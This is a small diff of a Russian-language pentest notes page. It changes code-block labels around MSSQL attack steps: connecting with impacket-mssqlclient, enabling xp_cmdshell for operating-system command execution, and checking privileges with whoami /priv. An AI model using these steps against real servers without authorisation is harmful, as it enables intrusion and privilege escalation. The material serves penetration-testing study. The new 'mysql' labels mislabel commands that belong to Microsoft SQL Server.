@@ -18,12 +18,12 @@ impacket-mssqlclient user:pass@ip -windows-auth
 
 
 Далее включаем работу командной оболочки
-```mssql
+```mysql
 SQL> enable_xp_cmdshell
 ```
 
 После чего проверяем свои привилегии
-```powershell
+```mysql
 SQL> xp_cmdshell whoami /priv
 ```
 
